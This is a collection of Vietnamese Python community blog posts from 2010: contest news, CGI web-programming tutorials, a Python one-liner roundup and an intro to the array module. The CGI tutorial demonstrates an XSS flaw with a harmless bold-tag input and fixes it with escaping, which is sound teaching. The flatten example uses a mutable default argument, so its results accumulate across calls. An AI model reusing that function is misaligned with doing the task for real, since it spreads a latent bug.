này đã khá hơn hẳn lần trước. Điều đó chứng tỏ trình độ lập trình bằng Python và cộng đồng sử dụng Python đã và đang lớn mạnh hơn. Đây cũng chính là mục đích của trang mạng Python cho người Việt được lập ra. Sau lễ trao giải, nhóm cũng đã có buổi thảo luận sôi nổi về việc sẽ thúc đẩy sinh hoạt gặp mặt trực tiếp nhằm nâng cao hơn nữa tay nghề. Hy vọng đây sẽ là một hoạt động bổ ích và thiết thực cho các bạn trẻ ham học hỏi. Bạn Hoàng Quốc Thịnh - người đã đoạt giải nhất trong cuộc thi lần trước - chia sẻ: Mình nghĩ không nên lạm dụng việc sinh hoạt trực tuyến nhiều quá, sinh hoạt trực tiếp gặp mặt có điểm lợi hơn đó là việc cái 'lửa' sẽ được tận mắt nhìn thấy và truyền cho nhau. Điều này, sinh hoạt trực tuyến không có được. Anh Nam cũng có cùng nhận định như trên và đang chuẩn bị cho những hoạt động đẩy mạnh trong thời gian sắp tới. K&K, 15:03 16/05/2010","tags":"Tin tức","title":"Trao giải cuộc thi viết webshell bằng Python"},{"url":"2010/04/python-27-beta-1-ra-mat.html","text":"Python 2.7 là phiên bản cuối cùng của Python 2 trước khi chuyển sang chế độ chỉ sửa lỗi, không thêm tính năng vào họ phiên bản này nữa. Tương tự như 2.6, phiên bản này sẽ chú trọng vào việc thêm vào những tính năng của Python 3 (chính xác là Python 3.1). Những cải tiến của phiên bản này bao gồm: Thêm loại từ điển có sắp xếp Thêm một số tính năng cho unittest như bỏ qua kiểm tra hay các phương pháp kiểm định mới. Mô đun io mới cho tốc độ nhanh hơn Tự đánh số các trường với phương pháp str.format() Mô đun sysconfig mới. ... cùng nhiều thay đổi khác nữa. Thông tin chi tiết về phiên bản này có thể được xem tại: Có những gì mới trong Python 2.7 Danh sách các thay đổi của Python 2.7","tags":"Tin tức","title":"Python 2.7 beta 1 ra mắt"},{"url":"2010/03/lap-trinh-web-voi-python-4.html","text":"Trong kỳ này, chúng ta sẽ xem xét một chương trình CGI có xử lý dữ liệu nhập. Ở kỳ trước, chúng ta đã biết cấu trúc chung của một chương trình CGI. Chương trình CGI mà chúng ta dùng làm ví dụ không thật sự hữu dụng vì chúng chỉ xuất giá trị ngẫu nhiên. Một chương trình CGI hữu dụng thường sẽ nhận dữ liệu nhập qua các mẫu đơn (form), xử lý các dữ liệu này, và trả về kết quả. Các dữ liệu nhập được truyền đến ứng dụng web ở dạng bộ 2 (khóa, giá trị) (key-value pair). Ví dụ nếu chúng ta điền vào một mẫu đơn có trường nhập tên là name và giá trị của nó là Nguyễn Việt Nam thì khóa sẽ là name và giá trị là Nguyễn Việt Nam . Thông thường có hai phương thức truyền dữ liệu đến ứng dụng web là GET và POST. Trong phương thức GET , các bộ 2 (khóa, giá trị) này sẽ được truyền qua URL. Với ví dụ ở trên, URL sẽ có dạng http://host/path?name=Nguyễn+Việt+Nam . Bạn đọc sẽ chú ý các điểm quan trọng sau: Đi ngay phía sau đường dẫn đến ứng dụng CGI là một dấu chấm hỏi ( ? ). Ký tự này dùng để thông báo phần phía sau là dữ liệu nhập. Phân cách giữa khóa và giá trị của dữ liệu nhập là dấu bằng ( = ). Khóa và giá trị được chuyển mã theo dạng phù hợp. Chúng ta thấy rằng ký tự khoảng trắng được chuyển thành ký tự cộng ( + ). Việc chuyển mã này nhằm làm cho URL không chứa các ký tự đặc biệt có thể gây nhầm lẫn. Không được nêu rõ trong ví dụ là ký tự phân cách các bộ 2 (khóa, giá trị) là ký tự và ( & ). Trong phương thức POST , các bộ 2 (khóa, giá trị) được truyền trong nội dung yêu cầu HTTP, và không hiện rõ cho người dùng. Hãy thử nghiệm với chương trình ví dụ sau (đặt tên nó là fp.py ): #!c:/python26/python print \"Content-Type: text/html\" print print \"\"\"<html> <head> <title>CGI form processing</title> </head> <body> <fieldset> <legend>Number guessing game</legend> <form method=\"POST\"> <label for=\"number\">Enter a number</label> <input type=\"text\" name=\"number\" value=\"\" /> <input type=\"submit\" /> </form> </fieldset> </body> </html> \"\"\" Kết quả mà chúng ta nhận được là một mẫu đơn như hình: Một số điểm quan trọng trong chương trình này là sự sử dụng các thẻ liên quan đến mẫu đơn. Trước hết là thẻ form dùng để thông báo sự bắt đầu của một mẫu đơn. Các thuộc tính (attribute) thông thường của thẻ này gồm method và action . Thuộc tính method xác định phương thức truyền dữ liệu. Chúng ta có thể sử dụng GET hoặc POST . Thuộc tính action xác định đường dẫn đến chương trình CGI sẽ xử lý mẫu đơn này. Nếu không xác định thì chính địa chỉ hiện tại sẽ được dùng. Thẻ input xác định một trường nhập. Thẻ này có các thuộc tính chính là type , name , và value . Thuộc tính type xác định kiểu nhập là một ô nhập (text box), một nút nhấn (button), một nút chọn (radio button), hoặc một tập tin (file). Ở ví dụ này chúng ta xác định một ô nhập với kiểu text . Thuộc tính name xác định khóa của bộ 2. Trong ví dụ này khóa nhập là number . Thuộc tính value xác định giá trị khởi đầu của trường nhập này. Chúng ta để trống. Thẻ input với thuộc tính type là submit sẽ tạo một nút nhấn. Nút nhấn này đặc biệt vì nó sẽ gửi các giá trị chúng ta nhập vào mẫu đơn đến chương trình CGI. Thông tin chi tiết về các thẻ HTML có thể được xem thêm từ các tài liệu từ W3C . Chương trình này cũng chỉ là in ra một mẫu đơn nhưng chúng ta đã có thể nhấn nút để gửi mẫu đơn đó đi. Chúng ta sẽ sửa nó để in lại những gì đã nhận từ trình duyệt. #!c:/python26/python import cgi print \"Content-Type: text/html\" print print \"\"\"<html> <head> <title>CGI form processing</title> </head> <body> <fieldset> <legend>Number guessing game</legend> <form method=\"POST\"> <label for=\"number\">Enter a number</label> <input type=\"text\" name=\"number\" value=\"\" /> <input type=\"submit\" /> </form> </fieldset> \"\"\" form = cgi . FieldStorage () if form . has_key ( 'number' ): print \"\"\"You have entered: %s \"\"\" % form . getfirst ( 'number' ) print \"\"\"</body> </html> \"\"\" Điều đầu tiên chúng ta nhận ra là sự sử dụng mô-đun cgi . Mô-đun này cho phép chúng ta tạo một đối tượng FieldStorage . Đối tượng FieldStorage chứa các bộ 2 (khóa, giá trị) chúng ta nhận được từ trình duyệt trong một cấu trúc như kiểu từ điển. Do đó chúng ta có thể dùng phương thức has_key để kiểm tra sự tồn tại của khóa tương ứng. Để lấy giá trị từ FieldStorage ta có thể dùng form['number'].value hoặc gọi các hàm như getvalue , getfirst , hay getlist . Các hàm này được đề cập đến một cách chi tiết trong bộ tài liệu sử dụng Python. Nếu tinh ý, chúng ta sẽ thấy rằng khi dữ liệu nhập chứa các thẻ HTML hợp lệ thì kết quả xuất ra sẽ hiển thị cả những thẻ HTML này. Ví dụ khi ta nhập Nguyễn <b>Việt</b> Nam . Điều này có thể là đúng theo ý định, hoặc cũng thể nằm ngoài mong muốn. Chúng ta gọi đây là các lỗi kịch bản chéo trang (Cross Site Scripting, XSS) . Cách khắc phục là trước khi hiển thị các chuỗi không nằm trong kiểm soát của chương trình (ví dụ như dữ liệu nhập, dữ liệu xuất từ hệ thống khác, v.v...), chúng ta sẽ cần chuyển mã các ký tự đặc biệt. Mô-đun cgi cung cấp hàm escape để làm việc này. Mã nguồn mới sẽ gói getfirst trong cgi.escape như sau: #!c:/python26/python import cgi print \"Content-Type: text/html\" print print \"\"\"<html> <head> <title>CGI form processing</title> </head> <body> <fieldset> <legend>Number guessing game</legend> <form method=\"POST\"> <label for=\"number\">Enter a number</label> <input type=\"text\" name=\"number\" value=\"\" /> <input type=\"submit\" /> </form> </fieldset> \"\"\" form = cgi . FieldStorage () if form . has_key ( 'number' ): print \"\"\"You have entered: %s \"\"\" % cgi . escape ( \\ form . getfirst ( 'number' ), True ) print \"\"\"</body> </html> \"\"\" Giờ đây, chuỗi được xuất ra sẽ giống hệt với chuỗi nhập. Chúng ta cũng có thể thử với phương thức GET bằng cách nhập thẳng URL http://localhost/cgi-bin/fp.py?number=Nguyễn+<b>Việt</b>+Nam . Chúng ta cũng sẽ nhận được kết quả tương tự. Vậy là qua hai phần chúng ta đã tìm hiểu về cách hoạt động của một chương trình CGI. Điểm mạnh của giao thức CGI là tính đơn giản và an toàn cao vì mỗi yêu cầu được một tiến trình riêng xử lý. Cũng chính vì mô hình đơn giản như vậy nên CGI gặp phải nhiều cản trở trong việc phát triển. Cản trở đầu tiên là chương trình CGI phải tự xử lý trạng thái giữa các yêu cầu kế tiếp nhau, hay còn gọi là phiên làm việc (session). Cản trở thứ hai là chương trình CGI sẽ phải được thiết kế đặc biệt nếu muốn sử dụng các biến có phạm vi toàn ứng dụng (application scope). Cuối cùng, chương trình CGI chạy chậm hơn và tốn tài nguyên hơn vì mỗi yêu cầu phải được xử lý riêng. Trong các phần tới, chúng ta sẽ xem qua cách hoạt động của những công nghệ tiên tiến, giải quyết được các điểm yếu của giao thức CGI.","tags":"Bài viết","title":"Lập trình web với Python (4)"},{"url":"2010/02/trao-giai-cuoc-thi-lap-trinh-game-bang-python.html","text":"Ngày 04 tháng 02 năm 2009, nhóm PCNV đã trao giải cuộc thi lập trình game với ngôn ngữ Python cho bạn Hoàng Quốc Thịnh . Cuộc thi lập trình game với ngôn ngữ Python là một trong những hoạt động của nhóm PCNV nhằm lôi cuốn sự tham gia tìm hiểu và khuyến khích sáng tạo trong việc sử dụng ngôn ngữ Python. Ngôn ngữ Python là một ngôn ngữ mạnh, đơn giản, và tổng quát. Ngoài việc được sử dụng trong các tổ chức lớn như Google, và NASA, Python còn được dùng để viết nên những trò chơi như EVE-Online với cả triệu người chơi, hay Ruồi Yêu Cứt với giải thưởng lập trình game bằng Python đầu tiên. Xin chúc mừng bạn Hoàng Quốc Thịnh. Hình bên dưới là bạn Nguyễn Thành Nam đại diện nhóm PCNV đang trao giải cho bạn Hoàng Quốc Thịnh trong bữa ăn thân mật. Hình chụp bởi nhiếp ảnh gia Thành Nguyễn (Malaysia) và sửa đôi chút bởi nhiếp ảnh gia Nguyễn Duy Thọ.","tags":"Tin tức","title":"Trao giải cuộc thi lập trình game bằng Python"},{"url":"2010/01/lap-trinh-web-voi-python-3.html","text":"Sau khi đã cài đặt máy chủ web, và Python ở hai bài trước, trong bài này chúng ta sẽ bước vào thế giới lập trình web với mô hình đơn giản nhất, mô hình CGI. CGI là viết tắt của Common Gateway Interface, dịch chính xác là giao tiếp cổng chung. Giao thức này được sinh ra để chuẩn hóa (hay xác định rõ) cách thức một máy chủ web giao phó việc tạo trang web cho các ứng dụng console (các ứng dụng nhận dữ liệu từ bộ nhập chuẩn và xuất ra bộ xuất chuẩn). Các ứng dụng này được gọi là các ứng dụng CGI, hay kịch bản CGI vì chúng thường được viết bằng ngôn ngữ kịch bản, mặc dù chúng cũng có thể được viết bằng các ngôn ngữ khác như C, Java. Mô hình hoạt động Thông thường, một máy chủ web nhận yêu cầu từ máy khách và tìm kiếm trên hệ thống xem có tập tin mà máy khách cần truy xuất hay không. Nếu có thì máy chủ web sẽ xuất nội dung của tập tin này cho máy khách. Trong giao thức CGI, máy chủ web nhận yêu cầu từ máy khách, tìm kiếm trên hệ thống xem có ứng dụng CGI đó không. Nếu có thì máy chủ web sẽ thực thi ứng dụng CGI, chuyển toàn bộ yêu cầu đến ứng dụng thông qua các biến môi trường và bộ nhập chuẩn. Ứng dụng CGI sẽ xử lý yêu cầu rồi gửi trả thông tin cho máy chủ web qua bộ xuất chuẩn. Máy chủ web sẽ nhận thông tin từ bộ xuất chuẩn của ứng dụng CGI để xuất trả lại cho máy khách. Mô hình hoạt động của giao thức CGI được miêu tả trong hình sau. Hello World Để hiểu rõ hơn cách hoạt động, chúng ta sẽ tạo một tập tin helloworld.py trong thư mục C:\\Program Files\\Apache Software Foundation\\Apache2.2\\cgi-bin với nội dung như sau: #!c:/python26/python print \"Content-Type: text/html\" print \"\" print \"Hello world.\" Trước khi giải thích từng dòng lệnh, chúng ta sẽ xem xem kết quả đạt được là gì. Chúng ta sẽ dùng trình duyệt để vào trang http://localhost/cgi-bin/helloworld.py . Dĩ nhiên chúng ta cũng phải đảm bảo rằng máy chủ Apache đang chạy. Và đây là hình mà chúng ta nhận được. Các yếu tố chính của chương trình CGI Như thế, chương trình CGI đầu tiên đã thực thi hoàn chỉnh. Hãy quay lại xem các yếu tố căn bản của một chương trình CGI viết bằng ngôn ngữ Python. Dòng đầu tiên được gọi là dòng shebang với hai ký tự đặc biệt #! . Phần đi ngay sau hai ký tự này là đường dẫn tuyệt đối đến trình thông dịch Python trên hệ thống. Dòng này nói cho máy chủ web biết rằng tập tin này cần được đọc bởi trình thông dịch Python. Dòng lệnh print thứ nhất cung cấp một đầu mục (header) cho máy chủ web. Đầu mục này là Content-Type với nội dung là text/html . Đây là đầu mục bắt buộc trong giao thức HTTP, do đó các ứng dụng CGI thông thường phải cung cấp đầu mục này. Dòng lệnh in thứ hai (in ra một dòng trống) báo hiệu sự kết thúc của các đầu mục, và những gì theo sau sẽ là dữ liệu nội dung. Dòng lệnh này là bắt buộc. Dòng lệnh in thứ ba xuất nội dung chính, là chuỗi Hello world. . Các dòng lệnh này là những yếu tố chính cấu tạo nên một chương trình CGI viết bằng ngôn ngữ Python. Điểm quan trọng nhất mà chúng ta cần lưu ý là việc xuất dữ liệu thông qua bộ xuất chuẩn (stdout), và định dạng của dữ liệu cần xuất (đầu mục, dòng trống, nội dung). Thêm vào các thẻ HTML Chương trình của chúng ta khá buồn tẻ vì chúng ta khai báo Content-Type là text/html nhưng chúng ta không dùng thẻ HTML. Chúng ta hãy sửa lại chương trình như sau: #!c:/python26/python print \"Content-Type: text/html\" print \"\" print \"\"\"<html> <head> <title>Python!</title> </head> <body> <font size=\"+3\">H</font>ello <font color=\"red\">HTML</font>. </body> </html>\"\"\" Quay lại trình duyệt và làm tươi (F5, hay Ctrl-R), chúng ta sẽ thấy hình như sau: Content-Type là quan trọng Những gì chúng ta vừa thực hiện là thay đổi nội dung mà chúng ta xuất ra bộ xuất chuẩn. Bây giờ, giữ cùng nội dung đấy, nhưng chúng ta thay đổi đầu mục Content-Type thành text/plain . #!c:/python26/python print \"Content-Type: text/plain\" print \"\" print \"\"\"<html> <head> <title>Python!</title> </head> <body> <font size=\"+3\">H</font>ello <font color=\"red\">HTML</font>. </body> </html>\"\"\" Thử xem trang này với các trình duyệt chuẩn ví dụ Opera, hoặc Firefox thì chúng ta sẽ nhận được hình tương tự như sau: Thay vì xử lý những thẻ HTML một cách đặc biệt thì trình duyệt đã không làm như vậy. Và đây là cách làm đúng bởi vì chúng ta nói cho trình duyệt biết rằng nội dung của chúng ta là ở dạng văn bản thường (plaintext) thông qua đầu mục Content-Type như trên. Trình duyệt IE không tuân theo chuẩn HTTP một cách triệt để nên vẫn sẽ hiển thị nội dung của chúng ta dưới dạng một trang HTML. Một ít dữ liệu động Mục đích của chương trình CGI là xử lý và xuất dữ liệu nên sẽ là vô ích nếu chương trình CGI của chúng ta chỉ xuất các trang web tĩnh. Chúng ta sẽ sửa lại chương trình một chút như sau: #!c:/python26/python import random actions = ( \"rocks\" , \"rules\" , \"kicks butt\" , \"constricts camel\" ) print \"Content-Type: text/html\" print \"\" print \"\"\"<html> <head> <title>Python!</title> </head> <body> Python %s . </body> </html>\"\"\" % random . choice ( actions ) Trong chương trình này, chúng ta sử dụng mô-đun random và hàm choice để chọn một hành động ngẫu nhiên. Khi làm tươi trình duyệt, chúng ta có thể gặp các hình tương tự như sau. Tóm tắt Trong kỳ này chúng ta đã được giới thiệu về mô hình hoạt động của giao thức CGI, các yếu tố quan trọng trong một chương trình CGI viết bằng ngôn ngữ Python, một ít kiến thức về giao thức HTTP, và sự đa dạng của thế giới trình duyệt web. Ở kỳ sau chúng ta sẽ tìm hiểu cách nhận dữ liệu từ máy khách qua URL và mẫu đơn (form).","tags":"Bài viết","title":"Lập trình web với Python (3)"},{"url":"2010/01/python-one-liner.html","text":"Python One-Liner là trường phái viết Python trên một dòng. Theo đó mỗi một hành động xác định được viết bởi các lệnh cô đọng gom lại trên một dòng duy nhất. Hành động xác định không phải là những hành động quá phức tạp, nhưng cũng không quá đơn giản. Ví dụ việc trao đổi giá trị giữa hai biến có thể coi là một hành động xác định như vậy. Python cho phép thực hiện điều này trên một dòng với một lệnh duy nhất, và với tôi đó là một trong những lệnh Python đẹp nhất: >>> a , b = b , a Python One-Liners cũng chính là tập hợp các mẹo (trick) Python nhằm giải quyết các bài toán nhỏ một cách ngắn gọn theo phương châm \"do a lot with a little.\" Điều này thường khó thực hiện ở các ngôn ngữ khác. Nhưng chúng có thể thực hiện được trong Python do đặc trưng ngôn ngữ hỗ trợ cách viết như vậy. Chẳng hạn cách dùng hàm lambda, List Comprehensions, map , filter , zip , dict , set ... đã xây dựng những đặc trưng ngôn ngữ cho phép viết các mã ngắn gọn hơn các ngôn ngữ khác. Trong bài viết này tôi sẽ tổng hợp một số các bài toán đơn giản mà triển khai Python có thể được viết trên một dòng. Chúng là các bài toán cơ bản có liên quan đến list . Tôi hi vọng những bạn chưa biết về các công thức trong bài này sẽ tìm thấy nhiều điểm lý thú, và qua đó càng hiểu được sức mạnh và sự hấp dẫn tuyệt vời của Python. Các công thức này một số được tôi thường xuyên sử dụng, một số được sưu tầm và các bạn có thể tìm thấy ở đâu đó trên internet. 1. Làm phẳng một list Cho một list dạng hai chiều như sau: L = [[1,2,3], [4,5,6], [7], [8,9]] hãy biến nó thành dạng một chiều dạng [1, 2, 3, 4, 5, 6, 7, 8, 9] . Đây là một số lời giải một dòng của bài toán này: >>> L = [[ 1 , 2 , 3 ],[ 4 , 5 , 6 ], [ 7 ], [ 8 , 9 ]] >>> sum ( L , []) >>> reduce ( lambda x , y : x + y , L ) >>> list ( itertools . chain ( L )) #import itertools. >>> [ item for sublist in L for item in sublist ] Python cung cấp cho bạn một tập hợp phong phú các cú pháp và hàm dựng sẵn cho phép bạn giải cùng một bài toán theo nhiều cách khác nhau. Trong các lời giải trên lời giải cuối cùng là nhanh nhất và nó cũng dễ hiểu nhất. Chi tiết các lời giải trên các bạn có thể xem trên trang: Making a flat list out of list of lists in python . Hàm reduce đã bị loại bỏ kể từ Python 3000 ( Suggested by Guido van Rossum ), tuy nhiên vẫn được giữa lại trong thư viện functools , do vậy bạn có thể dùng: >>> functools . reduce ( lambda x , y : x + y , L ) Nếu list L không phải là hai chiều, mà có thể chứa các list con đệ quy, bạn có thể dùng hàm sau: def flatten(seq, a = list()): try: for item in seq: flatten(item, a) except TypeError: a.append(seq) return a print flatten([[1,2, [3,4], 5], 6, [7, [8, 9]]]) 2. Loại bỏ các phần tử trùng nhau trong list Hãy tạo ra một list mới chứa các phần tử không trùng nhau của L. Một số cách giải trên một dòng: >>> L = dict . fromkeys ( L ) . keys () # Python 3.x trả về iterator >>> L = list ( set ( L )) >>> [ x for i , x in enumerate ( L ) if i == L . index ( x )] Với L = [5,6,1,1,1,2,2,2,3,3,3] hai lời giải trên cho kết quả [1, 2, 3, 5, 6] . Lời giải cuối cùng cho kết quả [5, 6, 1, 2, 3] . Như vậy trong một số tình huống lời giải cuối cùng tốt hơn, do nó vẫn giữ được thứ tự các phần tử như ban đầu. Tuy vậy lời giải cuối cùng chạy rất chậm. Hãy xem kết quả đo thời gian chạy của các lời giải như sau: >>> from timeit import Timer >>> Timer ( \"list(set(L))\" , \"L = range(10**4)\" ) . timeit ( 10 ) 0.030437396173560671 >>> Timer ( \"dict.fromkeys(L).keys()\" , \"L = range(10**4)\" ) . timeit ( 10 ) 0.027800167602894277 >>> Timer ( \"[x for i, x in enumerate(L) if i==L.index(x)]\" , \"L = range(10**4)\" ) . timeit ( 10 ) 25.005568798618903 Việc so sánh thời gian chạy giữa các Python One-Liner rất hay được các tác giả thực hiện. Chúng đánh giá khả năng sử dụng thực tế của mỗi công thức. Lời giải cuối cùng như các bạn thấy dù có ưu điểm song không thể dùng được khi có test xấu trên 10000 phần tử. 3. Đếm số phần tử có trong một list Nếu chỉ đếm một phần tử thì quá đơn giản, dùng list.count là xong, nhưng nếu để đếm tần số cho nhiều item một lúc thì làm thế nào. Chẳng hạn có L = [5,6,1,1,1,2,2,2,3,3] muốn tạo ra D={5:1, 6:1, 1:3, 2:3, 3:2} . >>> dict ([( x , L . count ( x )) for x in set ( L )]) >>> { x : L . count ( x ) for x in set ( L )} # dict comprehensions, có từ Python 3.x >>> collections . Counter ( L ) # import collections, có từ Python 3.x Lời giải số một tuy dài nhưng có thể chạy trên hầu hết các bản Python > 2.4. Lời giải số hai chẳng qua là từ 1 ra nhưng với cú pháp mới của Python 3.x nó dễ hiểu và đơn giản hơn. Lời giải cuối cùng đơn giản đến mức bạn chỉ cần có import collections . Module collections chứa các phương tiện cho phép bạn viết các mã Python ngắn gọn, và chạy rất nhanh. Một ví dụ khác về cách dùng Counter trong module collections , đoạn mã này cho phép đếm tần số xuất hiện của các ký tự trong một string: >>> collections . Counter ( \"abcabca\" ) Counter({'a': 3, 'c': 2, 'b': 2}) Càng về sau này các phiên bản Python càng hỗ trợ nhiều hơn các cú pháp và thư viện cho phép bạn viết các mã ngắn gọn hơn. Đây là đặc trưng của Python: Viết ít hơn làm nhiều hơn . Việc gia tăng hiểu biết của bạn về các thư viện là một kinh nghiệm quan trọng. 4. Chia một list thành nhiều list Bài toán chia một list thành nhiều list có thể gặp hai yêu cầu: Chia list thành nhiều list có độ dài bằng nhau Chia list thành n list con có độ dài tương đương nhau (với khác biệt kích thước nhỏ nhất). Vấn đề số một có thể giải quyết bằng các hàm sau: >>> SplitInto = lambda a , n : [ a [ i * n :( i + 1 ) * n ] \\ ... for i in range ( len ( a ) % n and len ( a ) / n + 1 or len ( a ) / n )] >>> SplitInto ( range ( 10 ), 3 ) [[0, 1, 2], [3, 4, 5], [6, 7, 8], [9]] >>> SplitInto = lambda L , n : zip ( * [ chain ( L , repeat ( None , n - 1 ))] * n ) >>> SplitInto ( range ( 10 ), 3 ) <zip object at 0x01D607D8> >>> list ( SplitInto ( range ( 10 ), 3 )) [(0, 1, 2), (3, 4, 5), (6, 7, 8), (9, None, None)] >>> SplitInto = lambda L , n : zip_longest ( * [ iter ( L )] * n ) >>> list ( SplitInto ( range ( 10 ), 3 )) [(0, 1, 2), (3, 4, 5), (6, 7, 8), (9, None, None)] >>> SplitInto = lambda L , n : zip_longest ( * [ iter ( L )] * n , fillvalue =- 1 ) >>> list ( SplitInto ( range ( 10 ), 3 )) [(0, 1, 2), (3, 4, 5), (6, 7, 8), (9, -1, -1)] >>> SplitInto = lambda L , n : [ L [ i : i + n ] for i in range ( 0 , len ( L ), n )] >>> SplitInto ( range ( 10 ), 3 ) [[0, 1, 2], [3, 4, 5], [6, 7, 8], [9]] Lời giải số 1, 4 dùng cho các phiên bản Python từ 2.3 trở đi. Hai lời giải 2, 3 sau đòi hỏi phải có lệnh from itertools import * và chỉ chạy từ Python 3.x trở đi. Chi tiết về các lời giải này các bạn có thể xem thêm: How do you split a list into evenly sized chunks in Python? Vấn đề số 2 có thể có lời giải sau: >>> SplitInto = lambda L , n : [ L [ i :: n ] for i in range ( n )] >>> SplitInto ( range ( 10 ), 3 ) # SplitInto(list(range(10)), 3) với Python 3.x [[0, 3, 6, 9], [1, 4, 7], [2, 5, 8]] Lời giải trên là đơn giản đến mức... không cần tìm thêm các lời giải khác làm gì cho mệt. Tuy nhiên nó không chia theo đúng thứ tự. Đây là cách khác phức tạp hơn nhưng giữ nguyên được thứ tự các phần tử: >>> SplitInto = lambda L , n : [ L [ int ( i * 1.0 * len ( L ) / n ): int (( i + 1 ) * 1.0 * len ( L ) / n )] \\ ... for i in range ( n )] >>> SplitInto ( range ( 10 ), 3 ) [[0, 1, 2], [3, 4, 5], [6, 7, 8, 9]] >>> SplitInto ( range ( 10 ), 2 ) [[0, 1, 2, 3, 4], [5, 6, 7, 8, 9]] >>> SplitInto ( range ( 10 ), 4 ) [[0, 1], [2, 3, 4], [5, 6], [7, 8, 9]] Cách viết này khá dài, nhưng giữ nguyên được thứ tự giữa các phần tử. Các dòng dài chính là đặc trưng của Python One-liner . 5. Kiểm tra một list là tập con của list khác Cho hai list a, b. kiểm tra xem a có chứa b hay không. Danh sách a chứa danh sách b nếu tất cả các phần tử của b đều có trong a. Cách giải sau đã có lần tôi trình bày, dùng thư viện operator và hàm built-in reduce , có thể dùng với mọi phiên bản Python 2.x: >>> a = [ 1 , 2 , 3 , 4 , 5 ] >>> b = [ 2 , 3 , 6 ] >>> c = [ 2 , 3 , 4 ] >>> reduce ( operator . and_ , map ( a . __contains__ , b )) False >>> reduce ( operator . and_ , map ( a . __contains__ , c )) True Từ Python 2.4 bạn có thể sử dụng set: >>> set ( a + b ) == set ( a ) False >>> set ( a + c ) == set ( a ) True >>> set ( c ) . issubset ( a ) True >>> set ( b ) . issubset ( a ) False >>> set ( c ) <= set ( a ) True >>> set ( b ) <= set ( a ) False Từ Python 2.5 bạn có thể viết: >>> all ([ x in a for x in b ]) False >>> all ([ x in a for x in c ]) True Module operator cung cấp cách dùng các toán tử như các hàm. Trong ví dụ 1 thực tế chúng ta dùng toán tử in thông thường. Các toán tử dùng như các hàm cho phép kết hợp với các hàm built-in khác để viết các lệnh Python rất ngắn gọn và thuận tiện. Một ví dụ (được lấy trong tài liệu Python) tính tích vô hướng hai vector: sum(map(operator.mul, vector1, vector2)) Thật khó để viết ngắn hơn và chạy nhanh hơn như vậy. Các ví dụ trên càng nói rõ hơn điều tôi đã nhấn mạnh ở mục 3: các phiên bản Python càng về sau càng hỗ trợ tốt hơn việc viết các mã ngắn gọn và hiệu quả. Tuy vậy bạn phải cân nhắc lựa chọn giải pháp đúng cho phiên bản Python mà nó sẽ chạy. 6. Sắp xếp nhiều column Cho các column a, b, c... có cùng kích thước. Hãy sắp xếp chúng theo thứ tự a, b, c.... Nội dung các dòng không thay đổi. Dưới đây là một ví dụ triển khai với 2 cột a, b: >>> a = [ 3 , 3 , 2 , 2 , 1 , 1 ] >>> b = [ \"c\" , \"b\" , \"b\" , \"a\" , \"c\" , \"a\" ] >>> a , b = zip ( * sorted ( zip ( a , b ))) >>> a (1, 1, 2, 2, 3, 3) >>> b ('a', 'c', 'a', 'b', 'b', 'c') Thật tuyệt!!!. Chúng đơn giản đến mức khó có thể ngắn gọn hơn nữa. Công thức trên trọn vẹn trên một dòng có ít hơn 80 ký tự. Tất cả chỉ có 4 lệnh. Ít nhất nó cũng gây cho tôi nhiều sự phấn khích và ngạc nhiên. Và các bạn sẽ thấy trên nhiều forum Python, việc tìm kiếm các \"One-Liner\" thực sự là thú vị và là trò chơi hấp dẫn của các Python guru. 7. Tổng kết Khi kích thước dữ liệu đầu vào lớn một số trong các hàm trả về list trên đây cần được thay thế bằng các hàm trạng thái. Chẳng hạn việc chia một list thành nhiều list bằng nhau nên viết thành hàm trạng thái, sẽ dùng ít bộ nhớ và nhanh hơn: def SplitInto ( a , n ): start = 0 end = len ( a ) % n and len ( a ) / n + 1 or len ( a ) / n while start < end : yield a [ start * n : ( start + 1 ) * n ] start += 1 Chuẩn viết mã Python là không quá 80 ký tự trên một dòng. Python One-Liner viết hết các lệnh Python trên một dòng, làm cho các line dài hơn bình thường. Mã Python khó đọc và khó hiểu hơn do cách viết cô đọng, các biến được đặt tên ngắn. Với các bài toán không mang tính cơ bản, các bạn nên hạn chế viết theo cách này. Các chương trình viết trên một dòng không có nghĩa là nhanh nhất. Thậm chí trong đa số các trường hợp để viết trên một dòng người ta phải chọn cách viết mất nhiều thời gian chạy hơn. Do vậy khi kích thước dữ liệu lớn, tốt hơn hết hãy lựa chọn cách viết tối ưu, và chấp nhận mã dài hơn. Tôi hi vọng rằng các bạn sẽ thích thú với các ví dụ trên đây. Chắc chắn còn nhiều cách giải khác cho mỗi vấn đề mà tôi đã nêu ra. Nếu các bạn tìm thấy chúng xin hãy vui lòng comment để mọi người cùng biết. Điều sau cùng tôi muốn nhấn mạnh là tuy việc tìm kiếm các lời giải một dòng cho mỗi vấn đề chỉ đơn giản là thú vui, ít mang tính ứng dụng, nhưng chúng thực sự sẽ thúc đẩy việc học hỏi và tìm kiếm kinh nghiệm của chúng ta. Một số bài tập Python có thể triển khai trên một dòng: Tạo ma trận đơn vị kích thước bất kỳ Triển khai sàng Sieve of Eratosthenes Triển khai dãy số Fibonacci. Tạo một list chứa tất cả các hoán vị của một list khác (các phần tử có thể bằng nhau).","tags":"Bài viết","title":"Python One-Liner"},{"url":"2010/01/efficient-arrays-co-nhanh-hon-list.html","text":"1. Giới thiệu về \"Efficient arrays\" Kiểu dữ liệu list có thể chứa đựng bất kỳ cái gì thuộc bất kỳ cấu trúc nào. Khái niệm về list (hay danh sách) trong Python gần gũi với ý niệm về cái túi (a bag). Một bag có thể chứa bánh kẹo, hoa quả, quần áo... Điểm khác biệt là list thì có thứ tự, các phần tử được truy cập qua một index duy nhất. Về điểm này list khác với khái niệm về array - hay mảng trong các ngôn ngữ thông thường khác. Chẳng hạn trong VB.NET một array là một danh sách có thứ tự các phần tử có cùng cấu trúc. Bạn luôn luôn phải chỉ rõ kiểu của phần tử trong mỗi array qua khai báo array of type . Chính vì list có thể chứa bất kỳ phần tử thuộc bất kỳ cấu trúc nào mà một số thao tác phụ thuộc vào cấu trúc dữ liệu trên mỗi phần tử có thể chậm đi đáng kể. Hay một số thao tác thông thường có sẵn trong các ngôn ngữ khác đã không được triển khai trong Python do kiểu dữ liệu có thể khác nhau giữa các phần tử. Chẳng hạn việc sắp xếp một danh sách sẽ chậm đi do phải xác định chính xác kiểu dữ liệu của mỗi phần tử khi so sánh. Việc đọc một list từ file text hoặc từ một string sẽ không được triển khai bằng các hàm built-in. Python hỗ trợ bạn tạo ra các list hiệu quả và chặt chẽ hơn bằng khái niệm \"Efficient arrays\" có trong thư viện array. Tuy nhiên module này chỉ hỗ trợ kiểu dữ liệu số và ký tự. Bạn không thể dùng các \"Efficient arrays\" cho các string 